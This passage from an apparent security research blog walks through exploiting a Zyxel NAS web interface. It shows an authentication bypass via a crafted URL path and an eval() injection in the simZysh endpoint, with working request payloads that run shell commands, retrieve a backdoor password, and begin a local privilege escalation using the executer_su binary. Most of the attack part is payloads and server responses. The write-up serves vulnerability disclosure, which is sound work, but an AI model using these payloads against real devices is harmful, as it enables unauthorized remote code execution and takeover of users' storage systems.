<span class="line"><span style="color: #D8DEE9FF">                     controller_n</span><span style="color: #ECEFF4">,</span><span style="color: #D8DEE9FF"> action_n</span><span style="color: #ECEFF4">,</span><span style="color: #D8DEE9FF"> </span><span style="color: #ECEFF4">&#039;</span><span style="color: #A3BE8C">cherrypy</span><span style="color: #ECEFF4">&#039;</span><span style="color: #ECEFF4">,</span><span style="color: #D8DEE9FF"> args</span><span style="color: #ECEFF4">))</span></span>
<span class="line"><span style="color: #D8DEE9FF">                    </span><span style="color: #81A1C1">if</span><span style="color: #D8DEE9FF"> </span><span style="color: #81A1C1">not</span><span style="color: #D8DEE9FF"> tmp_result</span><span style="color: #ECEFF4">:</span></span>
<span class="line"><span style="color: #D8DEE9FF">                        </span><span style="color: #81A1C1">raise</span><span style="color: #D8DEE9FF"> </span><span style="color: #8FBCBB">ValueError</span></span>
<span class="line"><span style="color: #D8DEE9FF">                    r_type </span><span style="color: #81A1C1">=</span><span style="color: #D8DEE9FF"> </span><span style="color: #88C0D0">type</span><span style="color: #ECEFF4">(</span><span style="color: #D8DEE9FF">tmp_result</span><span style="color: #ECEFF4">)</span></span>
<span class="line"><span style="color: #D8DEE9FF">                    </span><span style="color: #81A1C1">if</span><span style="color: #D8DEE9FF"> r_type </span><span style="color: #81A1C1">==</span><span style="color: #D8DEE9FF"> </span><span style="color: #88C0D0">list</span><span style="color: #ECEFF4">:</span></span>
<span class="line"><span style="color: #D8DEE9FF">                        r_value</span><span style="color: #ECEFF4">[</span><span style="color: #ECEFF4">&#039;</span><span style="color: #A3BE8C">zyshdata</span><span style="color: #EBCB8B">%d</span><span style="color: #ECEFF4">&#039;</span><span style="color: #D8DEE9FF"> </span><span style="color: #81A1C1">%</span><span style="color: #D8DEE9FF"> c_index</span><span style="color: #ECEFF4">]</span><span style="color: #D8DEE9FF"> </span><span style="color: #81A1C1">=</span><span style="color: #D8DEE9FF"> tmp_result</span></span>
<span class="line"><span style="color: #D8DEE9FF">                    </span><span style="color: #81A1C1">else</span><span style="color: #ECEFF4">:</span></span>
<span class="line"><span style="color: #D8DEE9FF">                        r_value</span><span style="color: #ECEFF4">[</span><span style="color: #ECEFF4">&#039;</span><span style="color: #A3BE8C">zyshdata</span><span style="color: #EBCB8B">%d</span><span style="color: #ECEFF4">&#039;</span><span style="color: #D8DEE9FF"> </span><span style="color: #81A1C1">%</span><span style="color: #D8DEE9FF"> c_index</span><span style="color: #ECEFF4">]</span><span style="color: #D8DEE9FF"> </span><span style="color: #81A1C1">=</span><span style="color: #D8DEE9FF"> </span><span style="color: #ECEFF4">[</span></span>
<span class="line"><span style="color: #D8DEE9FF">                         tmp_result</span><span style="color: #ECEFF4">]</span></span>
<span class="line"><span style="color: #D8DEE9FF">                    r_value</span><span style="color: #ECEFF4">[</span><span style="color: #ECEFF4">&#039;</span><span style="color: #A3BE8C">errno</span><span style="color: #EBCB8B">%d</span><span style="color: #ECEFF4">&#039;</span><span style="color: #D8DEE9FF"> </span><span style="color: #81A1C1">%</span><span style="color: #D8DEE9FF"> c_index</span><span style="color: #ECEFF4">]</span><span style="color: #D8DEE9FF"> </span><span style="color: #81A1C1">=</span><span style="color: #D8DEE9FF"> </span><span style="color: #B48EAD">0</span></span>
<span class="line"><span style="color: #D8DEE9FF">                    r_value</span><span style="color: #ECEFF4">[</span><span style="color: #ECEFF4">&#039;</span><span style="color: #A3BE8C">errmsg</span><span style="color: #EBCB8B">%d</span><span style="color: #ECEFF4">&#039;</span><span style="color: #D8DEE9FF"> </span><span style="color: #81A1C1">%</span><span style="color: #D8DEE9FF"> c_index</span><span style="color: #ECEFF4">]</span><span style="color: #D8DEE9FF"> </span><span style="color: #81A1C1">=</span><span style="color: #D8DEE9FF"> </span><span style="color: #88C0D0">_</span><span style="color: #ECEFF4">(</span><span style="color: #ECEFF4">&#039;</span><span style="color: #A3BE8C">OK</span><span style="color: #ECEFF4">&#039;</span><span style="color: #ECEFF4">)</span></span>
<span class="line"><span style="color: #D8DEE9FF">                </span><span style="color: #81A1C1">except</span><span style="color: #ECEFF4">:</span></span>
<span class="line"><span style="color: #D8DEE9FF">                    r_value</span><span style="color: #ECEFF4">[</span><span style="color: #ECEFF4">&#039;</span><span style="color: #A3BE8C">zyshdata</span><span style="color: #EBCB8B">%d</span><span style="color: #ECEFF4">&#039;</span><span style="color: #D8DEE9FF"> </span><span style="color: #81A1C1">%</span><span style="color: #D8DEE9FF"> c_index</span><span style="color: #ECEFF4">]</span><span style="color: #D8DEE9FF"> </span><span style="color: #81A1C1">=</span><span style="color: #D8DEE9FF"> </span><span style="color: #ECEFF4">[]</span></span>
<span class="line"><span style="color: #D8DEE9FF">                    r_value</span><span style="color: #ECEFF4">[</span><span style="color: #ECEFF4">&#039;</span><span style="color: #A3BE8C">errno</span><span style="color: #EBCB8B">%d</span><span style="color: #ECEFF4">&#039;</span><span style="color: #D8DEE9FF"> </span><span style="color: #81A1C1">%</span><span style="color: #D8DEE9FF"> c_index</span><span style="color: #ECEFF4">]</span><span style="color: #D8DEE9FF"> </span><span style="color: #81A1C1">=</span><span style="color: #D8DEE9FF"> </span><span style="color: #81A1C1">-</span><span style="color: #B48EAD">99999</span></span>
<span class="line"><span style="color: #D8DEE9FF">                    r_value</span><span style="color: #ECEFF4">[</span><span style="color: #ECEFF4">&#039;</span><span style="color: #A3BE8C">errmsg</span><span style="color: #EBCB8B">%d</span><span style="color: #ECEFF4">&#039;</span><span style="color: #D8DEE9FF"> </span><span style="color: #81A1C1">%</span><span style="color: #D8DEE9FF"> c_index</span><span style="color: #ECEFF4">]</span><span style="color: #D8DEE9FF"> </span><span style="color: #81A1C1">=</span><span style="color: #D8DEE9FF"> </span><span style="color: #88C0D0">_</span><span style="color: #ECEFF4">(</span><span style="color: #ECEFF4">&#039;</span><span style="color: #A3BE8C">Execute Error</span><span style="color: #ECEFF4">&#039;</span><span style="color: #ECEFF4">)</span></span>
<span class="line"><span style="color: #D8DEE9FF"> </span></span>
<span class="line"><span style="color: #D8DEE9FF">            </span><span style="color: #81A1C1">else</span><span style="color: #ECEFF4">:</span></span>
<span class="line"><span style="color: #D8DEE9FF">                </span><span style="color: #81A1C1">break</span></span>
<span class="line"><span style="color: #D8DEE9FF">            c_index </span><span style="color: #81A1C1">+=</span><span style="color: #D8DEE9FF"> </span><span style="color: #B48EAD">1</span></span>
<span class="line"><span style="color: #D8DEE9FF"> </span></span>
<span class="line"><span style="color: #D8DEE9FF">        </span><span style="color: #81A1C1">return</span><span style="color: #D8DEE9FF"> r_value</span></span>
<span class="line"><span style="color: #D8DEE9FF"> </span></span>
<span class="line"><span style="color: #D8DEE9FF">    simZysh</span><span style="color: #ECEFF4">.</span><span style="color: #D8DEE9FF">exposed </span><span style="color: #81A1C1">=</span><span style="color: #D8DEE9FF"> </span><span style="color: #81A1C1">True</span></span></code></pre></div>



<p>Reading this code, these are the key takeaways:</p>



<ol class="wp-block-list">
<li>The request path is checked for formatting, but its value is not used. We need it to contain a valid substring to bypass mod_auth_zyxel, but we don’t want to trigger the python filtering as well. The “check_str_format” function verifies its first argument against a pattern depending on its second argument. Thus:
<ol style="list-style-type:lower-alpha" class="wp-block-list">
<li>We must match the regex ‘^[0-9a-zA-Z_]+$’</li>



<li>The regex is called on individual parts of the URL path. “/foo/bar” is filtered twice, first for “foo” and then for “bar”. Both must match the regex individually.</li>
</ol>
</li>



<li>The request arguments are then also filtered. The request body should contain a key:value mapping, where the key and values may not contain the following characters:
<ol style="list-style-type:lower-alpha" class="wp-block-list">
<li>\</li>



<li>‘</li>



<li>`</li>



<li>&lt;</li>



<li>^</li>



<li>$</li>



<li>&amp;</li>



<li>;</li>
</ol>
</li>



<li>The provided data is selected for “eval()” based on a “c%d” pattern, where the digit is incremented for each call. A “legitimate” invocation of this endpoint would have “c0”:”controller action args” as its first element.</li>



<li>The values obtained from each incremental key are split into three sections delimited by whitespace: controller name, action name and args. The split keeps whitespace in “args”, since it only chops our string by the first two spaces.</li>



<li>This gives us a controlled injection point of “eval(‘controllers..(cherrypy=cherrypy, arguments=’)”.
<ul class="wp-block-list">
<li>This is Python 2.7, requiring us to dust off some older techniques.</li>



<li>We know “;” is disallowed from step 2, but parenthesis and double quotes (“) are allowed. We can work with this.</li>
</ul>
</li>



<li>The return value from successful calls will be returned if the evaluated code does not raise an exception, giving us a reflected injection.</li>
</ol>



<p>How would we go about injecting a command here? The easiest target would be “args”, since that gives us the possibility to keep some whitespace.</p>



<p>Before we go about crafting payloads, we need to bypass mod_auth_zyxel whilst not triggering the Python filters. Circling back to AuthZyxelSkipPattern, we see a nice token that would work well for us: “/register_main/setCookie”. By simply appending that substring, we can reach our desired endpoint without any pesky authentication.</p>



<div class="wp-block-kevinbatdorf-code-block-pro" data-code-block-pro-font-family="Code-Pro-JetBrains-Mono" style="font-size:.875rem;font-family:Code-Pro-JetBrains-Mono,ui-monospace,SFMono-Regular,Menlo,Monaco,Consolas,monospace;line-height:1.25rem;--cbp-tab-width:2"><span role="button" data-code="POST /cmd,/simZysh/register_main/setCookie" style="color:#d8dee9ff" aria-label="Copy" class="code-block-pro-copy-button"></span><pre class="shiki nord" style="background-color: #2e3440ff"><code><span class="line"><span style="color: #88C0D0">POST</span><span style="color: #D8DEE9FF"> </span><span style="color: #A3BE8C">/cmd,/simZysh/register_main/setCookie</span></span></code></pre></div>



<p>The next step would be to construct our “eval()” injection. Remember, we have control of argument 1, 2, and 4 in this format string:</p>



<div class="wp-block-kevinbatdorf-code-block-pro" data-code-block-pro-font-family="Code-Pro-JetBrains-Mono" style="font-size:.875rem;font-family:Code-Pro-JetBrains-Mono,ui-monospace,SFMono-Regular,Menlo,Monaco,Consolas,monospace;line-height:1.25rem;--cbp-tab-width:2"><span role="button" data-code="                    tmp_result = eval('controller.%s.%s(cherrypy=%s, arguments=%s)' % (
                     controller_n, action_n, 'cherrypy', args))" style="color:#d8dee9ff" aria-label="Copy" class="code-block-pro-copy-button"></span><pre class="shiki nord" style="background-color: #2e3440ff"><code><span class="line"><span style="color: #D8DEE9FF">                    tmp_result </span><span style="color: #81A1C1">=</span><span style="color: #D8DEE9FF"> </span><span style="color: #88C0D0">eval</span><span style="color: #ECEFF4">(</span><span style="color: #ECEFF4">&#039;</span><span style="color: #A3BE8C">controller.</span><span style="color: #EBCB8B">%s</span><span style="color: #A3BE8C">.</span><span style="color: #EBCB8B">%s</span><span style="color: #A3BE8C">(cherrypy=</span><span style="color: #EBCB8B">%s</span><span style="color: #A3BE8C">, arguments=</span><span style="color: #EBCB8B">%s</span><span style="color: #A3BE8C">)</span><span style="color: #ECEFF4">&#039;</span><span style="color: #D8DEE9FF"> </span><span style="color: #81A1C1">%</span><span style="color: #D8DEE9FF"> </span><span style="color: #ECEFF4">(</span></span>
<span class="line"><span style="color: #D8DEE9FF">                     controller_n</span><span style="color: #ECEFF4">,</span><span style="color: #D8DEE9FF"> action_n</span><span style="color: #ECEFF4">,</span><span style="color: #D8DEE9FF"> </span><span style="color: #ECEFF4">&#039;</span><span style="color: #A3BE8C">cherrypy</span><span style="color: #ECEFF4">&#039;</span><span style="color: #ECEFF4">,</span><span style="color: #D8DEE9FF"> args</span><span style="color: #ECEFF4">))</span></span></code></pre></div>



<p>In order to not raise any exceptions, we need to find a controller that doesn’t do anything illegal given the state we’ve ended up in. Many controllers would for example attempt to access our non-existent authentication token, which they expect to see in our cookie.</p>



<p>One controller that would work well is “controllers.storage_ext_cgi.CGIGetExstStoInfo”, which generally deals with returning information related to storage volumes on this NAS.</p>



<p>With this information, we can create a sample body. Remember, we must generate valid Python, so we’ll need to add a closing parenthesis:</p>



<div class="wp-block-kevinbatdorf-code-block-pro" data-code-block-pro-font-family="Code-Pro-JetBrains-Mono" style="font-size:.875rem;font-family:Code-Pro-JetBrains-Mono,ui-monospace,SFMono-Regular,Menlo,Monaco,Consolas,monospace;line-height:1.25rem;--cbp-tab-width:2"><span role="button" data-code="c0=’storage_ext_cgi CGIGetExtStoInfo None) and False or eval(“1+1”)#’" style="color:#d8dee9ff" aria-label="Copy" class="code-block-pro-copy-button"></span><pre class="shiki nord" style="background-color: #2e3440ff"><code><span class="line"><span style="color: #D8DEE9FF">c0</span><span style="color: #81A1C1">=</span><span style="color: #D8DEE9FF">’storage_ext_cgi CGIGetExtStoInfo </span><span style="color: #81A1C1">None</span><span style="color: #D8DEE9FF">) </span><span style="color: #81A1C1">and</span><span style="color: #D8DEE9FF"> </span><span style="color: #81A1C1">False</span><span style="color: #D8DEE9FF"> </span><span style="color: #81A1C1">or</span><span style="color: #D8DEE9FF"> </span><span style="color: #88C0D0">eval</span><span style="color: #ECEFF4">(</span><span style="color: #D8DEE9FF">“</span><span style="color: #B48EAD">1</span><span style="color: #81A1C1">+</span><span style="color: #B48EAD">1</span><span style="color: #D8DEE9FF">”</span><span style="color: #ECEFF4">)</span><span style="color: #616E88">#’</span></span></code></pre></div>



<p>Where the comment “#” is to ensure the already-existing closing parenthesis is ignored in the eval call.</p>



<p>With that request, we get the following response:</p>



<div class="wp-block-kevinbatdorf-code-block-pro" data-code-block-pro-font-family="Code-Pro-JetBrains-Mono" style="font-size:.875rem;font-family:Code-Pro-JetBrains-Mono,ui-monospace,SFMono-Regular,Menlo,Monaco,Consolas,monospace;line-height:1.25rem;--cbp-tab-width:2"><span role="button" data-code="200 OK
{
&quot;errno0&quot;: 0,
&quot;errmsg0&quot;: &quot;OK&quot;,
&quot;zyshdata0&quot;: [
2
]
}" style="color:#d8dee9ff" aria-label="Copy" class="code-block-pro-copy-button"></span><pre class="shiki nord" style="background-color: #2e3440ff"><code><span class="line"><span style="color: #88C0D0">200</span><span style="color: #D8DEE9FF"> </span><span style="color: #A3BE8C">OK</span></span>
<span class="line"><span style="color: #ECEFF4">{</span></span>
<span class="line"><span style="color: #88C0D0">&quot;errno0&quot;</span><span style="color: #88C0D0">:</span><span style="color: #D8DEE9FF"> </span><span style="color: #B48EAD">0</span><span style="color: #A3BE8C">,</span></span>
<span class="line"><span style="color: #88C0D0">&quot;errmsg0&quot;</span><span style="color: #88C0D0">:</span><span style="color: #D8DEE9FF"> </span><span style="color: #ECEFF4">&quot;</span><span style="color: #A3BE8C">OK</span><span style="color: #ECEFF4">&quot;</span><span style="color: #A3BE8C">,</span></span>
<span class="line"><span style="color: #88C0D0">&quot;zyshdata0&quot;</span><span style="color: #88C0D0">:</span><span style="color: #D8DEE9FF"> [</span></span>
<span class="line"><span style="color: #88C0D0">2</span></span>
<span class="line"><span style="color: #D8DEE9FF">]</span></span>
<span class="line"><span style="color: #ECEFF4">}</span></span></code></pre></div>



<p>Bingo! That’s all we need for code execution, finally giving us that sweet, sweet backdoor password.</p>



<div class="wp-block-kevinbatdorf-code-block-pro" data-code-block-pro-font-family="Code-Pro-JetBrains-Mono" style="font-size:.875rem;font-family:Code-Pro-JetBrains-Mono,ui-monospace,SFMono-Regular,Menlo,Monaco,Consolas,monospace;line-height:1.25rem;--cbp-tab-width:2"><span role="button" data-code="c0=’storage_ext_cgi CGIGetExtStoInfo None) and False or __import__(“subprocess”).check_output(“makekey”, shell=True)#’

# returns...
200 OK
{
&quot;errno0&quot;: 0,
&quot;errmsg0&quot;: &quot;OK&quot;,
&quot;zyshdata0&quot;: [
&quot;Zimi3ffN\n&quot;
]
}" style="color:#d8dee9ff" aria-label="Copy" class="code-block-pro-copy-button"></span><pre class="shiki nord" style="background-color: #2e3440ff"><code><span class="line"><span style="color: #D8DEE9">c0</span><span style="color: #81A1C1">=</span><span style="color: #A3BE8C">’storage_ext_cgi</span><span style="color: #D8DEE9FF"> </span><span style="color: #88C0D0">CGIGetExtStoInfo</span><span style="color: #D8DEE9FF"> </span><span style="color: #A3BE8C">None</span><span style="color: #D8DEE9FF">) and False or __import__</span><span style="color: #ECEFF4">(</span><span style="color: #88C0D0">“subprocess”</span><span style="color: #ECEFF4">)</span><span style="color: #D8DEE9FF">.check_output</span><span style="color: #ECEFF4">(</span><span style="color: #88C0D0">“makekey”,</span><span style="color: #D8DEE9FF"> </span><span style="color: #A3BE8C">shell=True</span><span style="color: #ECEFF4">)</span><span style="color: #D8DEE9FF">#’</span></span>
<span class="line"></span>
<span class="line"><span style="color: #616E88"># returns...</span></span>
<span class="line"><span style="color: #88C0D0">200</span><span style="color: #D8DEE9FF"> </span><span style="color: #A3BE8C">OK</span></span>
<span class="line"><span style="color: #ECEFF4">{</span></span>
<span class="line"><span style="color: #88C0D0">&quot;errno0&quot;</span><span style="color: #88C0D0">:</span><span style="color: #D8DEE9FF"> </span><span style="color: #B48EAD">0</span><span style="color: #A3BE8C">,</span></span>
<span class="line"><span style="color: #88C0D0">&quot;errmsg0&quot;</span><span style="color: #88C0D0">:</span><span style="color: #D8DEE9FF"> </span><span style="color: #ECEFF4">&quot;</span><span style="color: #A3BE8C">OK</span><span style="color: #ECEFF4">&quot;</span><span style="color: #A3BE8C">,</span></span>
<span class="line"><span style="color: #88C0D0">&quot;zyshdata0&quot;</span><span style="color: #88C0D0">:</span><span style="color: #D8DEE9FF"> [</span></span>
<span class="line"><span style="color: #88C0D0">&quot;Zimi3ffN\n&quot;</span></span>
<span class="line"><span style="color: #D8DEE9FF">]</span></span>
<span class="line"><span style="color: #ECEFF4">}</span></span></code></pre></div>



<p>Now, you might be thinking &#8211; Can’t we use this command injection straight up, instead of opening up the backdoor?</p>



<p>Of course &#8211; we just need to resolve a slight issue regarding permissions first.</p>



<h3 class="wp-block-heading" id="h-cve-2024-29975-local-privilege-escalation-vulnerability"><span class="ez-toc-section" id="cve-2024-29975-%e2%80%93-local-privilege-escalation-vulnerability"></span><a>CVE-2024-29975 &#8211; Local Privilege Escalation Vulnerability</a><span class="ez-toc-section-end"></span></h3>



<p>Using the payload in the previous section to execute “id”, we get the following output:</p>



<div class="wp-block-kevinbatdorf-code-block-pro" data-code-block-pro-font-family="Code-Pro-JetBrains-Mono" style="font-size:.875rem;font-family:Code-Pro-JetBrains-Mono,ui-monospace,SFMono-Regular,Menlo,Monaco,Consolas,monospace;line-height:1.25rem;--cbp-tab-width:2"><span role="button" data-code="c0=’ storage_ext_cgi CGIGetExtStoInfo None) and False or __import__(&quot;subprocess&quot;).check_output(&quot;id&quot;, shell=True)#’

200 OK
{
&quot;errno0&quot;: 0,
&quot;errmsg0&quot;: &quot;OK&quot;,
&quot;zyshdata0&quot;: [
&quot;uid=99(nobody) gid=99(nobody) groups=99(nobody)\n&quot;
]
}" style="color:#d8dee9ff" aria-label="Copy" class="code-block-pro-copy-button"></span><pre class="shiki nord" style="background-color: #2e3440ff"><code><span class="line"><span style="color: #D8DEE9">c0</span><span style="color: #81A1C1">=</span><span style="color: #A3BE8C">’</span><span style="color: #D8DEE9FF"> </span><span style="color: #88C0D0">storage_ext_cgi</span><span style="color: #D8DEE9FF"> </span><span style="color: #A3BE8C">CGIGetExtStoInfo</span><span style="color: #D8DEE9FF"> </span><span style="color: #A3BE8C">None</span><span style="color: #D8DEE9FF">) and False or __import__</span><span style="color: #ECEFF4">(</span><span style="color: #88C0D0">&quot;subprocess&quot;</span><span style="color: #ECEFF4">)</span><span style="color: #D8DEE9FF">.check_output</span><span style="color: #ECEFF4">(</span><span style="color: #88C0D0">&quot;id&quot;</span><span style="color: #88C0D0">,</span><span style="color: #D8DEE9FF"> </span><span style="color: #A3BE8C">shell=True</span><span style="color: #ECEFF4">)</span><span style="color: #D8DEE9FF">#’</span></span>
<span class="line"></span>
<span class="line"><span style="color: #88C0D0">200</span><span style="color: #D8DEE9FF"> </span><span style="color: #A3BE8C">OK</span></span>
<span class="line"><span style="color: #ECEFF4">{</span></span>
<span class="line"><span style="color: #88C0D0">&quot;errno0&quot;</span><span style="color: #88C0D0">:</span><span style="color: #D8DEE9FF"> </span><span style="color: #B48EAD">0</span><span style="color: #A3BE8C">,</span></span>
<span class="line"><span style="color: #88C0D0">&quot;errmsg0&quot;</span><span style="color: #88C0D0">:</span><span style="color: #D8DEE9FF"> </span><span style="color: #ECEFF4">&quot;</span><span style="color: #A3BE8C">OK</span><span style="color: #ECEFF4">&quot;</span><span style="color: #A3BE8C">,</span></span>
<span class="line"><span style="color: #88C0D0">&quot;zyshdata0&quot;</span><span style="color: #88C0D0">:</span><span style="color: #D8DEE9FF"> [</span></span>
<span class="line"><span style="color: #88C0D0">&quot;uid=99(nobody) gid=99(nobody) groups=99(nobody)\n&quot;</span></span>
<span class="line"><span style="color: #D8DEE9FF">]</span></span>
<span class="line"><span style="color: #ECEFF4">}</span></span></code></pre></div>



<p>Sadly informing us that we are underprivileged.</p>



<p>What can we do about this? If only there was something like “sudo” on this firmware without any password requirements&#8230;</p>



<p>Of course there is.</p>



<p>In one of my many sidetracks fueled by coffee and sleepless nights caused by exams, I decided to look into other methods of compromising the NAS – more on that later &#8211; and in doing so I happened to stumble upon a neat piece of code when decompiling another CGI endpoint called “file_upload-cgi&#8221;.</p>



<div class="wp-block-kevinbatdorf-code-block-pro" data-code-block-pro-font-family="Code-Pro-JetBrains-Mono" style="font-size:.875rem;font-family:Code-Pro-JetBrains-Mono,ui-monospace,SFMono-Regular,Menlo,Monaco,Consolas,monospace;line-height:1.25rem;--cbp-tab-width:2"><span role="button" data-code="undefined4 funny_function(undefined4 param_1,undefined4 param_2,undefined4 param_3,char *param_4)
{
  undefined4 uVar1;
  char acStack_10c [256];
  int local_c;
  
  sprintf(acStack_10c,
          &quot;/usr/local/apache/web_framework/bin/executer_su /usr/bin/python -c \&quot;from models import C A_main_model; CA_main_model.import_ca(\\\&quot;%s\\\&quot;)\&quot;&quot;
          ,param_3);
  local_c = system(acStack_10c);
  local_c = local_c &gt;&gt; 8;
  if (local_c == 0) {
    unlink(param_4);
    uVar1 = 1;
  }
  else {
    unlink(param_4);
    uVar1 = 0xffffffff;
  }
  return uVar1;
}" style="color:#d8dee9ff" aria-label="Copy" class="code-block-pro-copy-button"></span><pre class="shiki nord" style="background-color: #2e3440ff"><code><span class="line"><span style="color: #D8DEE9FF">undefined4 </span><span style="color: #88C0D0">funny_function</span><span style="color: #ECEFF4">(</span><span style="color: #D8DEE9FF">undefined4 </span><span style="color: #D8DEE9">param_1</span><span style="color: #ECEFF4">,</span><span style="color: #D8DEE9FF">undefined4 </span><span style="color: #D8DEE9">param_2</span><span style="color: #ECEFF4">,</span><span style="color: #D8DEE9FF">undefined4 </span><span style="color: #D8DEE9">param_3</span><span style="color: #ECEFF4">,</span><span style="color: #81A1C1">char</span><span style="color: #D8DEE9FF"> </span><span style="color: #81A1C1">*</span><span style="color: #D8DEE9">param_4</span><span style="color: #ECEFF4">)</span></span>
<span class="line"><span style="color: #ECEFF4">{</span></span>
<span class="line"><span style="color: #D8DEE9FF">  undefined4 uVar1</span><span style="color: #81A1C1">;</span></span>
<span class="line"><span style="color: #D8DEE9FF">  </span><span style="color: #81A1C1">char</span><span style="color: #D8DEE9FF"> acStack_10c </span><span style="color: #ECEFF4">[</span><span style="color: #B48EAD">256</span><span style="color: #ECEFF4">]</span><span style="color: #81A1C1">;</span></span>
<span class="line"><span style="color: #D8DEE9FF">  </span><span style="color: #81A1C1">int</span><span style="color: #D8DEE9FF"> local_c</span><span style="color: #81A1C1">;</span></span>
<span class="line"><span style="color: #D8DEE9FF">  </span></span>
<span class="line"><span style="color: #D8DEE9FF">  </span><span style="color: #88C0D0">sprintf</span><span style="color: #ECEFF4">(</span><span style="color: #D8DEE9FF">acStack_10c</span><span style="color: #ECEFF4">,</span></span>
<span class="line"><span style="color: #D8DEE9FF">          </span><span style="color: #ECEFF4">&quot;</span><span style="color: #A3BE8C">/usr/local/apache/web_framework/bin/executer_su /usr/bin/python -c </span><span style="color: #EBCB8B">\&quot;</span><span style="color: #A3BE8C">from models import C A_main_model; CA_main_model.import_ca(</span><span style="color: #EBCB8B">\\\&quot;</span><span style="color: #A3BE8C">%s</span><span style="color: #EBCB8B">\\\&quot;</span><span style="color: #A3BE8C">)</span><span style="color: #EBCB8B">\&quot;</span><span style="color: #ECEFF4">&quot;</span></span>
<span class="line"><span style="color: #D8DEE9FF">          </span><span style="color: #ECEFF4">,</span><span style="color: #D8DEE9FF">param_3</span><span style="color: #ECEFF4">)</span><span style="color: #81A1C1">;</span></span>
<span class="line"><span style="color: #D8DEE9FF">  local_c </span><span style="color: #81A1C1">=</span><span style="color: #D8DEE9FF"> </span><span style="color: #88C0D0">system</span><span style="color: #ECEFF4">(</span><span style="color: #D8DEE9FF">acStack_10c</span><span style="color: #ECEFF4">)</span><span style="color: #81A1C1">;</span></span>
<span class="line"><span style="color: #D8DEE9FF">  local_c </span><span style="color: #81A1C1">=</span><span style="color: #D8DEE9FF"> local_c </span><span style="color: #81A1C1">&gt;&gt;</span><span style="color: #D8DEE9FF"> </span><span style="color: #B48EAD">8</span><span style="color: #81A1C1">;</span></span>
<span class="line"><span style="color: #D8DEE9FF">  </span><span style="color: #81A1C1">if</span><span style="color: #D8DEE9FF"> </span><span style="color: #ECEFF4">(</span><span style="color: #D8DEE9FF">local_c </span><span style="color: #81A1C1">==</span><span style="color: #D8DEE9FF"> </span><span style="color: #B48EAD">0</span><span style="color: #ECEFF4">)</span><span style="color: #D8DEE9FF"> </span><span style="color: #ECEFF4">{</span></span>
<span class="line"><span style="color: #D8DEE9FF">    </span><span style="color: #88C0D0">unlink</span><span style="color: #ECEFF4">(</span><span style="color: #D8DEE9FF">param_4</span><span style="color: #ECEFF4">)</span><span style="color: #81A1C1">;</span></span>
<span class="line"><span style="color: #D8DEE9FF">    uVar1 </span><span style="color: #81A1C1">=</span><span style="color: #D8DEE9FF"> </span><span style="color: #B48EAD">1</span><span style="color: #81A1C1">;</span></span>
<span class="line"><span style="color: #D8DEE9FF">  </span><span style="color: #ECEFF4">}</span></span>
<span class="line"><span style="color: #D8DEE9FF">  </span><span style="color: #81A1C1">else</span><span style="color: #D8DEE9FF"> </span><span style="color: #ECEFF4">{</span></span>
<span class="line"><span style="color: #D8DEE9FF">    </span><span style="color: #88C0D0">unlink</span><span style="color: #ECEFF4">(</span><span style="color: #D8DEE9FF">param_4</span><span style="color: #ECEFF4">)</span><span style="color: #81A1C1">;</span></span>
<span class="line"><span style="color: #D8DEE9FF">    uVar1 </span><span style="color: #81A1C1">=</span><span style="color: #D8DEE9FF"> </span><span style="color: #81A1C1">0x</span><span style="color: #B48EAD">ffffffff</span><span style="color: #81A1C1">;</span></span>
<span class="line"><span style="color: #D8DEE9FF">  </span><span style="color: #ECEFF4">}</span></span>
<span class="line"><span style="color: #D8DEE9FF">  </span><span style="color: #81A1C1">return</span><span style="color: #D8DEE9FF"> uVar1</span><span style="color: #81A1C1">;</span></span>
<span class="line"><span style="color: #ECEFF4">}</span></span></code></pre></div>



<p>As we can see, it’s performing a call to ‘system’ using a binary named “executor_su”. Trying to use it with our previous command injection, we note the following output:</p>



<div class="wp-block-kevinbatdorf-code-block-pro" data-code-block-pro-font-family="Code-Pro-JetBrains-Mono" style="font-size:.875rem;font-family:Code-Pro-JetBrains-Mono,ui-monospace,SFMono-Regular,Menlo,Monaco,Consolas,monospace;line-height:1.25rem;--cbp-tab-width:2"><span role="button" data-code="c0=’storage_ext_cgi CGIGetExtStoInfo None) and False or __import__(&quot;subprocess&quot;).check_output(&quot;/usr/local/apache/web_framework/bin/executer_su id&quot;, shell=True)#’

200 OK
{
&quot;errno0&quot;: 0,
&quot;errmsg0&quot;: &quot;OK&quot;,
&quot;zyshdata0&quot;: [
&quot;-1\n&quot;
]
}" style="color:#d8dee9ff" aria-label="Copy" class="code-block-pro-copy-button"></span><pre class="shiki nord" style="background-color: #2e3440ff"><code><span class="line"><span style="color: #D8DEE9">c0</span><span style="color: #81A1C1">=</span><span style="color: #A3BE8C">’storage_ext_cgi</span><span style="color: #D8DEE9FF"> </span><span style="color: #88C0D0">CGIGetExtStoInfo</span><span style="color: #D8DEE9FF"> </span><span style="color: #A3BE8C">None</span><span style="color: #D8DEE9FF">) and False or __import__</span><span style="color: #ECEFF4">(</span><span style="color: #88C0D0">&quot;subprocess&quot;</span><span style="color: #ECEFF4">)</span><span style="color: #D8DEE9FF">.check_output</span><span style="color: #ECEFF4">(</span><span style="color: #88C0D0">&quot;/usr/local/apache/web_framework/bin/executer_su id&quot;</span><span style="color: #88C0D0">,</span><span style="color: #D8DEE9FF"> </span><span style="color: #A3BE8C">shell=True</span><span style="color: #ECEFF4">)</span><span style="color: #D8DEE9FF">#’</span></span>
<span class="line"></span>
<span class="line"><span style="color: #88C0D0">200</span><span style="color: #D8DEE9FF"> </span><span style="color: #A3BE8C">OK</span></span>
<span class="line"><span style="color: #ECEFF4">{</span></span>
<span class="line"><span style="color: #88C0D0">&quot;errno0&quot;</span><span style="color: #88C0D0">:</span><span style="color: #D8DEE9FF"> </span><span style="color: #B48EAD">0</span><span style="color: #A3BE8C">,</span></span>
<span class="line"><span style="color: #88C0D0">&quot;errmsg0&quot;</span><span style="color: #88C0D0">:</span><span style="color: #D8DEE9FF"> </span><span style="color: #ECEFF4">&quot;</span><span style="color: #A3BE8C">OK</span><span style="color: #ECEFF4">&quot;</span><span style="color: #A3BE8C">,</span></span>
<span class="line"><span style="color: #88C0D0">&quot;zyshdata0&quot;</span><span style="color: #88C0D0">:</span><span style="color: #D8DEE9FF"> [</span></span>
<span class="line"><span style="color: #88C0D0">&quot;-1\n&quot;</span></span>
<span class="line"><span style="color: #D8DEE9FF">]</span></span>
<span class="line"><span style="color: #ECEFF4">}</span></span></code></pre></div>



<p>It didn’t want to execute that. Another glance at “file_upload-cgi&#8221; shows that the second argument to “executer_su” is an absolute path – let&#8217;s try that.</p>



